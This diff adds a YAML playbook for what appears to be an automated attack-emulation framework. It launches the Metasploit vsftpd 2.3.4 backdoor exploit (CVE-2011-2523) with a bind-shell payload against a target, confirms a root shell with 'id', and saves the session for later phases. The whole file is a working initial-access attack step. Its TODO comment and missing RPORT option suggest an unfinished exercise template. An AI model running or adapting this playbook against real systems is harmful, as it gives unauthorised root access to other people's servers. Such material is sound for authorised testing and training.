@@ -1,0 +1,44 @@
+# Phase 4: Initial Access - vsftpd 2.3.4 Backdoor (CVE-2011-2523)
+#
+# Background: A malicious developer inserted a backdoor into the vsftpd 2.3.4
+# source tarball in 2011. Any login attempt with a username containing ":)"
+# causes the daemon to open a root bind shell on port 6200.
+#
+# Result:     Root shell session (no privilege escalation needed)
+# Variables required: $TARGET
+# Variables set:      $SESSION_NAME, $LAST_MSF_SESSION
+# ATT&CK: T1190 (Exploit Public-Facing Application)
+#
+# Note: This exploit is timing-sensitive and may take a while or not succeed on the first attempt.
+
+
+commands:
+  - type: debug
+    cmd: "Attempting vsftpd 2.3.4 backdoor against $TARGET port 21..."
+
+  # TODO: Run the vsftpd exploit module.
+  # Fill in the module name (cmd) and the target port (RPORT).
+  - type: msf-module
+    cmd: exploit/unix/ftp/vsftpd_234_backdoor
+    payload: cmd/unix/bind_ruby
+    creates_session: vsftpd_shell
+    options:
+      RHOSTS: $TARGET
+    exit_on_error: true
+    metadata:
+      tactic: "TA0001"
+      technique: "T1190"
+      technique_name: "Exploit Public-Facing Application"
+
+  # Confirm we have a shell and check privilege level (expect: uid=0 / root)
+  - type: msf-session
+    session: vsftpd_shell
+    cmd: id
+
+  # Store the session name in $SESSION_NAME so subsequent includes can reference it
+  - type: setvar
+    variable: SESSION_NAME
+    cmd: vsftpd_shell
+
+  - type: debug
+    cmd: "vsftpd shell established. Running as: $RESULT_STDOUT"
